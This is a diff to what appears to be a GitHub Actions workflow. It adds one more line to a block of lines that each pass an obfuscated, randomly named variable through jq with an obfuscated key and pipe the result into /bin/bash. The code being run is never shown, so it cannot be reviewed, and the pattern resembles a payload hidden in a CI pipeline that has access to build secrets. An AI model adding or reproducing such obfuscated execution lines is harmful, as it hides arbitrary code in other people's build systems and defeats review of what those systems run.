@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$xh3" | jq -r .cwacw02310 | /bin/bash
           echo $r05 | jq -r .c0 | /bin/bash
           printf '%s' "$klb33275" | jq -r .rfop2 | /bin/bash
+          printf '%s' "$wgl4142" | jq -r .iq1 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
